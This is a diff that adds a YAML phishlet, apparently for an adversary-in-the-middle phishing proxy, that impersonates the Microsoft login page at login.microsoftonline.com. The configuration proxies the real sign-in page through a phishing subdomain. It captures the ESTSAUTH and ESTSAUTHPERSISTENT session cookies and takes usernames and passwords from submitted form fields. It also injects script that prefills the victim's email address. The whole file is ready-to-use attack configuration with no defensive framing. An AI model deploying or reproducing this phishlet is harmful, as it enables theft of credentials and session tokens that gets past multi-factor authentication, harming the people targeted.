@@ -1,0 +1,35 @@
+name: 'service2'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '{{.Endpoint2}}', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+sub_filters:
+  - {trg: 'login.microsoftonline.com', orig: 'login.microsoftonline.com', repl: '{{.Endpoint2}}.{hostname}'}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+js_inject:
+  - trigger: 'login.microsoftonline.com'
+    code: |
+      (function() {
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        if (email) {
+          var emailField = document.querySelector('input[name="login"]');
+          if (emailField) {
+            emailField.value = email;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+          }
+        }
+      })()
